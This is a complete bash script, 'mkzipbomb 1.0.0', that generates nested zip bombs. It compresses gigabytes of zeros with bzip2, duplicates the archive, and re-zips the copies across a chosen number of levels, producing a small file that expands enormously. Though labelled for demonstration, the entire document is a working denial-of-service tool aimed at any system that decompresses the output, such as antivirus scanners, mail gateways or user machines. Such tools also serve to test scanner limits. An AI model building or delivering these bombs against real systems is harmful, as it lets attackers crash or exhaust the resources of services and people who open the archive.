#!/bin/bash
# mkzipbomb 1.0.0 - create simple zip bombs (for demonstration purposes only)
# copyright: (c) 2012 edloaa <edloaa at googlemail dot com>
# license: gpl-3 <http://www.gnu.org/licenses/gpl-3.0.txt>
wdir=$(mktemp -d)
usage() { echo -e "\e[1;31musage: $0 -s [size (GB)] -n [pkg number] -l [level] (use integer)\e[0m"; exit 1; }
while getopts ":s:l:n:" opts; do
	case $opts in
		s) size="$OPTARG" ;;
		n) num="$OPTARG" ;;
		l) lvl="$OPTARG" ;;
		*) usage ;;
	esac
done
[[ "$size" =~ ^[0-9]+$ ]] && [[ "$lvl" =~ ^[0-9]+$ ]] && [[ "$num" =~ ^[0-9]+$ ]] && [ $(($size*$lvl*$num)) -ne 0 ] || usage
echo "working dir: $wdir"; mkdir -p $wdir; cd $wdir
dd if=/dev/zero bs=1G count=$size | zip -9 -Z bzip2 1-01.zip -
for ((x=1; x<=$lvl; x++)); do
	[ $x -gt 1 ] && {
		zip -xi -9 -Z bzip2 $x-01.zip *
		rm $(($x-1))-*
	}
	for ((y=2; y<=$num; y++)); do
		[ $y -le 9 ] && cp $x-01.zip $x-0$y.zip || cp $x-01.zip $x-$y.zip	
	done
done
zip -xi -9 -Z bzip2 zipbomb.zip *
rm $lvl-*
[ -f zipbomb.zip ] && echo "file: $wdir/zipbomb.zip" || echo "error"
